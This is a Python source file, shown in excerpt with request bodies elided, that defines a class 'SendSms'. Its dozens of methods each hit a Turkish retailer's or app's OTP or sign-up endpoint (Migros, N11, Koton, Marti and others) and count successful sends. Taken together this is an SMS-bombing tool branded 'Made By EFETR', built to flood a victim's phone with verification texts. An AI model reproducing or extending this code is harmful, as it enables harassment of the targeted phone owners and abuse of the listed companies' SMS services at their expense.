...
class SendSms():
    ...
    def KahveDunyasi(self):    
        try:    
            ...
            if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> core.kahvedunyasi.com")
                self.adet += 1
            else:
                raise
        except:    
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> core.kahvedunyasi.com")
    ...
    def Wmf(self):
        try:
            ...
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
                self.adet += 1   
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
    ...
    def Bim(self):
        try:
            ...
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")
    ...
    def Englishhome(self):
        try:
            ...
            if home.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com")
    ...
    def Mopas(self):
        try:
            ...
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> mopas.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> mopas.com.tr")
    ...
    def Icq(self):
        try:
            ...
            if r.json()["response"]["statusCode"] == 200:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> u.icq.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> u.icq.net")
    ...
    def Suiste(self):
        try:
            ...
            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")
    ...
    def KimGb(self):
        try:
            ...
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
    ...
    def Tazi(self):
        try:
            ...
            if (r.json()["kod"]) == "0000":
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapiv2.tazi.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapiv2.tazi.tech")
    ...
    def N11(self):
        try:
            ...
            if (r.json()["isSuccess"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapi.n11.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.n11.com")
    ...
    def Evidea(self):
        try:
            ...
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com") 
    ...
    def Marti(self):
        try:
            ...
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> customer.martiscooter.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> customer.martiscooter.com")
    ...
    def Hey(self):
        try:
            ...
            r = requests.post(url, headers=headers)
            if r.json()["IsSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> heyapi.heymobility.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> heyapi.heymobility.tech")
    ...
    def Bineq(self):
        try:
            ...
            if r.json()["IsSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> bineqapi.heymobility.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> bineqapi.heymobility.tech")
    ...
    def Bisu(self):
        try:
            ...
            if r.json()["errors"] == None:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> bisu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> bisu.com.tr")
    ...
    def Ucdortbes(self):
        try:
            ...
            if r.json()["error"] == "E-Posta veya telefon zaten kayıtlı!":
                print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.345dijital.com")
            else:
                raise
        except:
            print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.345dijital.com")
            self.adet += 1
    ...
    def Macro(self):
        try:
            ...
            if r.json()["successful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.macrocenter.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.macrocenter.com.tr")
    ...
    def TiklaGelsin(self):
        try:
            ...
            if r.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")
    ...
    def Ayyildiz(self):
        try:
            ...
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.altinyildizclassics.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.altinyildizclassics.com")
    ...
    def Naosstars(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.naosstars.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.naosstars.com")
    ...
    def Istegelsin(self):
        try:
            ...
            if r.json()["data"]["sendOtp2"]["alreadySent"] == False:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> prod.fasapi.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> prod.fasapi.net")
    ...
    def Koton(self):
        try:
            ...
            r = requests.post(url, headers=headers, data=data)
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> koton.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> koton.com")
    ...
    def Hayatsu(self):
        try:
            ...
            if r.json()["IsSuccessful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> hayatsu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> hayatsu.com.tr")
    ...
    def Pisir(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if r.json()["ok"] == "1":
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.pisir.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.pisir.com")
    ...
    def Hizliecza(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> hizlieczaprodapi.hizliecza.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> hizlieczaprodapi.hizliecza.net")
    ...
    def Ipragaz(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr")
    ...
    def Metro(self):
        try:
            ...
            if r.json()["status"] == "success":
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> feature.metro-tr.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> feature.metro-tr.com")
    ...
    def Kumport(self):
        try:
            ...
            if r.text.replace("\"", "").split(",")[1].split(":")[1].lower() == "true":
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> online.kumport.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> online.kumport.com.tr")
    ...
    def Qumpara(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> tr-api.fisicek.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> tr-api.fisicek.com")
    ...
    def Paybol(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if r.json()["status"] == 0:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> pyb-mobileapi.walletgate.io")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> pyb-mobileapi.walletgate.io")
    ...
    def Migros(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if r.json()["successful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.migros.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.migros.com.tr")
    ...
    def File(self):
        try:
            ...
            if r.json()["responseType"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.filemarket.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.filemarket.com.tr")
    ...
    def Roombadi(self):
        try:
            ...
            if r.json()["remainingTime"] == 120:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.roombadi.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.roombadi.com")
    ...
    def Go(self):
        try:
            ...
            if r.json()["data"]["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> gomobilapp.ipragaz.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> gomobilapp.ipragaz.com.tr")
    ...
    def Joker(self):
        try:
            ...
            if r.json()["message"] == "Doğrulama kodu gönderildi.":
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.joker.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.joker.com.tr")
    ...
    def Akasya(self):
        try:
            ...
            if r.json()["result"] == "SMS sended succesfully!":
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> akasya-admin.poilabs.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> akasya-admin.poilabs.com")
    ...
    def Akbati(self):
        try:
            ...
            r = requests.post(url=url, headers=headers, json=json)
            if r.json()["result"] == "SMS sended succesfully!":
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> akbati-admin.poilabs.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> akbati-admin.poilabs.com")
    ...
    def Clickme(self):
        try:
            ...
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> dev-azure-mobile-api.clickmelive.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> dev-azure-mobile-api.clickmelive.com")
    ...
    def Happy(self):
        try:
            ...
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> happy.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> happy.com.tr")
    ...
    def Komagene(self):
        try:
            ...
            r = requests.post(url=url, headers=headers, json=json)
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> gateway.komagene.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> gateway.komagene.com.tr")
    ...
    def KuryemGelsin(self):
        try:
            ...
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.kuryemgelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.kuryemgelsin.com")
    ...
    def Porty(self):
        try:
            ...
            r = requests.post(url=url, json=json, headers=headers)
            if r.json()["status"]== "success":
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> panel.porty.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> panel.porty.tech")
    ...
    def Taksim(self):
        try:
            ...
            r = requests.post(url=url, json=json)
            if r.json()["success"]== True:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> service.taksim.digital")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> service.taksim.digital")
    ...
    def Tasdelen(self):
        try:
            ...
            if r.json()["Result"]== True:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> 94.102.66.162:80")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> 94.102.66.162:80")
    ...
    def Tasimacim(self):
        try:
            ...
            r = requests.post(url=url, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> server.tasimacim.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> server.tasimacim.com")
    ...
    def ToptanTeslim(self):
        try:
            ...
            r = requests.post(url=url, data=data, headers=headers)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> tt.etic.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> tt.etic.com.tr")
    ...
    def Unilever(self):
        try:
            ...
            if r.json()["status"] == 1:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> siparisdirekt.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> siparisdirekt.com")
    ...
    def Uysal(self):
        try:
            ...
            r = requests.post(url=url, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.uysalmarket.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.uysalmarket.com.tr")
    ...
    def Yapp(self):
        try:
            ...
            r = requests.post(url=url, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> yapp.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> yapp.com.tr")
    ...
    def YilmazTicaret(self):
        try:
            ...
            if r.json()["giris"] == "success":
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> yilmazticaret.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> yilmazticaret.net")
    ...
    def Yuffi(self):
        try:
            ...
            r = requests.post(url, json=json)
            if r.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.yuffi.co")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yuffi.co")
    ...
    def  Beefull(self):
        try:
            ...
            r = requests.post(url, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Made By EFETR | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.beefull.io")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made By EFETR | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.beefull.io")
